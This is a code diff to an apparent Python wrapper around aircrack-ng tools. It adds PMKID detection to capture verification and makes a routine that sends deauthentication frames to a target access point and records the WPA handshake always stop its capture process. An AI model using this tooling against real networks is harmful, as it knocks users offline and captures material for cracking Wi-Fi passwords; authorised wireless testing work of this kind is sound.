@@ -206,7 +206,8 @@ def do_watch(iface: str, bssid: str, channel: int, seconds: int, work_dir: str,
 def _verify_capture(capfile: str, runner=default_runner) -> tuple[bool, int]:
     out = runner(aircrack_check_argv(capfile), 60)
     n = parse_handshake_count(out)
-    return n > 0, n
+    pmkid = bool(re.search(r"with\s+PMKID", out or "", re.I))
+    return (n > 0 or pmkid), n
 
 
 def do_capture(iface: str, bssid: str, channel: int, seconds: int, work_dir: str,
@@ -240,15 +241,17 @@ def do_capture_deauth(iface: str, bssid: str, channel: int, seconds: int, work_d
     prefix = os.path.join(session_dir, "cap")
 
     proc = popen(airodump_pcap_argv(iface, bssid, channel, prefix))
-    sleep(PRE_DEAUTH_WAIT)
-    runner(aireplay_deauth_argv(iface, bssid, count, client), 30)
-    remaining = max(seconds - PRE_DEAUTH_WAIT, 0)
-    sleep(remaining)
-    proc.terminate()
     try:
-        proc.wait(timeout=10)
-    except Exception:
-        proc.kill()
+        sleep(PRE_DEAUTH_WAIT)
+        runner(aireplay_deauth_argv(iface, bssid, count, client), 30)
+        sleep(max(seconds - PRE_DEAUTH_WAIT, 0))
+    finally:
+        # airodump must never outlive this helper, whatever happened above
+        proc.terminate()
+        try:
+            proc.wait(timeout=10)
+        except Exception:
+            proc.kill()
 
     capfile = _newest_pcap(session_dir)
     if not capfile:
